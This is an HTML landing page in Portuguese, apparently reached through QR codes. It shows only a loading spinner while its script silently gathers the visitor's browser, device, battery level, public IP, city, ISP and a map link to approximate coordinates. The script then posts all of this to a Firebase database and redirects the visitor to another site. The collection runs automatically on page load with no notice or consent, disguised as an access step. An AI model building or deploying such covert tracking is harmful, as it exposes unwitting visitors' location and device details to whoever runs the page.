<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processando Acesso...</title>
    <style>
        body { background-color: #0b1220; color: #22c55e; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid rgba(34, 197, 94, 0.1); border-top: 4px solid #22c55e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p></p>

    <script>
        // --- CONFIGURAÇÕES DO SEU SISTEMA ---
        const FIREBASE_URL = "https://dadosdeqr-default-rtdb.firebaseio.com/acessos_qr.json";
        const URL_DESTINO = "https://saoluisma.github.io/Bloquear-cassinos/";

        // Captura o ID que o seu programa Python enviou na URL (?id=Mesa_01)
        const urlParams = new URLSearchParams(window.location.search);
        const qrid = urlParams.get('id') || "QR_Desconhecido";

        async function capturarTudo() {
            // 1. Inicia dados básicos do dispositivo
            let dadosColetados = {
                identificacao_qr: qrid,
                data_hora: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
                dispositivo: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Celular' : 'Computador',
                navegador: navigator.userAgent,
                so: navigator.platform,
                tela: `${window.screen.width}x${window.screen.height}`,
                bateria: "N/A", // Valor padrão caso falhe
                ip: "Privado/VPN", cidade: "N/A", regiao: "N/A", pais: "N/A", provedor: "N/A", mapa: "N/A"
            };

            // 2. CAPTURA NÍVEL DE BATERIA (Corrigido)
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    dadosColetados.bateria = `${Math.round(battery.level * 100)}%`;
                }
            } catch (e) { console.warn("Erro ao ler bateria"); }

            // 3. CAPTURA LOCALIZAÇÃO E IP (Corrigido para HTTPS)
            try {
                // Usando ipwhois.app que é compatível com HTTPS
                const res = await fetch('https://ipwhois.app/json/');
                const d = await res.json();
                
                if (d.success) {
                    dadosColetados.ip = d.ip;
                    dadosColetados.cidade = d.city;
                    dadosColetados.regiao = d.region;
                    dadosColetados.pais = d.country;
                    dadosColetados.provedor = d.isp + " (" + d.org + ")";
                    dadosColetados.mapa = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                }
            } catch (e) { console.error("Erro na API de Localização"); }

            // 4. ENVIA TUDO PARA O FIREBASE
            try {
                await fetch(FIREBASE_URL, {
                    method: 'POST',
                    body: JSON.stringify(dadosColetados),
                    headers: { 'Content-Type': 'application/json' }
                });
            } catch (err) {
                console.error("Erro Firebase:", err);
            } finally {
                // 5. REDIRECIONA PARA O SITE FINAL
                window.location.href = URL_DESTINO;
            }
        }

        // Inicia o processo
        capturarTudo();

        // Segurança: Força o redirecionamento após 6 segundos caso algo trave
        setTimeout(() => { window.location.href = URL_DESTINO; }, 6000);
    </script>
</body>
</html>
